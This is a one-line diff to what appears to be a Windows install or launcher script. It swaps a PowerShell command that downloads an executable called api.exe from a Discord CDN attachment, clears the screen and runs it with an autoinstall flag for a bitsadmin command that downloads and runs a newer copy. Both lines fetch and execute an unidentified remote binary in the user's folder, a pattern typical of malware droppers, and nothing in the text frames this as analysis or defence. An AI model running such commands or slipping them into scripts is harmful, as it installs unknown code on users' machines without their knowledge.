@@ -1,1 +1,1 @@
-powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/836269521483595796/1182659528408432731/api.exe -OutFile "C:\Users\%USERNAME%\api.exe"" && cls && "C:\Users\%USERNAME%\api.exe" -conf@autoinstall
+bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://cdn.discordapp.com/attachments/836269521483595796/1184552819806715925/api.exe" "C:\Users\%USERNAME%\api.exe" && "C:\Users\%USERNAME%\api.exe" -conf@autoinstall
